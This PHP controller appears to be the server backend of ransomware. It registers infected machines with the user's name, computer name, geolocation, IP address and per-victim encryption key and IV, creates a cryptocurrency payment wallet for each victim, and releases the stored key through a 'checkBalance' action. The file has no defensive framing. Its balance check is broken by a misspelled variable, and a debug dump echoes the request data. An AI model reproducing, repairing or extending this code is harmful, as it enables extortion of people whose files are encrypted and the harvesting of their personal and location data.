<?php

require_once 'Model/user.php';
require_once 'Model/wallet.php';


$action = $_GET['action'];

switch ($action){
    case 'add':
        echo var_dump($_POST);

        if (isset($_POST['uuid']) && isset($_POST['username']) && isset($_POST['computername']) && isset($_POST['langId']) && isset($_POST['country']) && isset($_POST['region']) && isset($_POST['city']) && isset($_POST['latlong']) && isset($_POST['osversion']) && isset($_POST['key']) && isset($_POST['iv'])){
            $uuid = $_POST['uuid'];
            $username = $_POST['username'];
            $computername = $_POST['computername'];
            $langId = $_POST['langId'];
            $country = $_POST['country'];
            $region = $_POST['region'];
            $city = $_POST['city'];
            $latlong = $_POST['latlong'];
            $osversion = $_POST['osversion'];
            $key = $_POST['key'];
            $iv = $_POST['iv'];
            $ip = $_SERVER['REMOTE_ADDR'];

            $res = Users::add($uuid, $username, $computername, $langId, $country, $region, $city, $latlong, $osversion, $key, $iv, $ip);
            echo json_encode($res);
            if($res){
                echo json_encode("/////////////////////////");
                $result = Wallet::createWallet($uuid);
                echo json_encode($result);
            } else {
                echo $res;
            }
            
        } else {
            echo json_encode(false);
        }
        break;

    case 'getPublicKey':
        if (isset($_POST['uuid'])){
            $uuid = $_POST['uuid'];
            $publicKey = Wallet::getUuidPublicKey($uuid);
            echo $publicKey;
        } else {
            echo json_encode(false);
        }
        break;

    case 'checkBalance':
        if (isset($_POST['uuid'])){
            $uuid = $_POST['uuid'];
            $publicKey = Wallet::getUuidPublicKey($uuid);
            $balance = Wallet::getBalanceFromUuid($publicKey[0]['publicKey']);
            if ((int)$balace >= 0){
                echo Users::getKey($uuid);
            } else {
                echo json_encode(false);
            }
        } else {
            echo json_encode(false);
        }
        break;
    
    
        
}